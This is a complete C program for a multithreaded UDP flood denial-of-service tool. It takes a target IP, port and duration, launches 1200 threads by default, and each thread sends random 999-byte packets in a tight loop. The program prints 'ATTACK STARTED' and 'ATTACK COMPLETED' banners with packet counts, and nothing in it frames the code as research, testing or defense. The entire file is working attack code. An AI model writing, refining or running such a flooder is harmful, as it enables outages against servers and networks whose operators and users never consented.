#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <math.h>

#define DEFAULT_PACKET_SIZE 999
#define DEFAULT_THREAD_COUNT 1200

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int thread_id;
} attack_params;

volatile int keep_running = 1;
volatile unsigned long total_packets_sent = 0;
char *global_payload = NULL;

void handle_signal(int signal) {
    keep_running = 0;
}

void generate_random_payload(char *payload, int size) {
    memset(payload, 0, size);
    for (int i = 0; i < size; i++) {
        payload[i] = (rand() % 256);
    }
}

void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    time_t end_time = time(NULL) + params->duration;
    unsigned long packets_sent_by_thread = 0;

    while (time(NULL) < end_time && keep_running) {
        sendto(sock, global_payload, DEFAULT_PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        __sync_fetch_and_add(&total_packets_sent, 1);
        packets_sent_by_thread++;
    }

    close(sock);
    printf("\033[1;32mThread %d\033[0m sent \033[1;33m%lu packets\033[0m.\n", params->thread_id, packets_sent_by_thread);
    return NULL;
}

void display_progress(time_t start_time, int duration) {
    time_t now = time(NULL);
    int elapsed = (int)difftime(now, start_time);
    int remaining = duration - elapsed;
    if (remaining < 0) remaining = 0;

    printf("\033[2K\r");
    printf("\033[1;36mTime Remaining:\033[0m \033[1;35m%02d:%02d\033[0m\n", remaining / 60, remaining % 60);
    printf("\033[1;34mTotal Packets Sent:\033[0m \033[1;35m%lu\033[0m\n", total_packets_sent);
    fflush(stdout);
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("\033[1;33mUsage: %s <IP> <PORT> <DURATION>\033[0m\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = (argc > 4) ? atoi(argv[4]) : DEFAULT_THREAD_COUNT;

    signal(SIGINT, handle_signal);

    global_payload = (char *)malloc(DEFAULT_PACKET_SIZE);
    if (!global_payload) {
        perror("\033[1;31mMemory allocation failed\033[0m");
        return EXIT_FAILURE;
    }
    generate_random_payload(global_payload, DEFAULT_PACKET_SIZE);

    pthread_t threads[thread_count];
    attack_params params[thread_count];

    time_t start_time = time(NULL);
    printf("\033[1;32m🔥 ATTACK STARTED ON %s:%d FOR %d SECONDS\033[0m\n", target_ip, target_port, duration);

    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].thread_id = i;

        pthread_create(&threads[i], NULL, udp_flood, &params[i]);
    }

    while (keep_running && time(NULL) < start_time + duration) {
        display_progress(start_time, duration);
        usleep(100000);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n\033[1;32m🚀 ATTACK COMPLETED.\033[0m \033[1;34mTotal packets sent:\033[0m \033[1;35m%lu\033[0m\n", total_packets_sent);
    free(global_payload);
    return 0;
}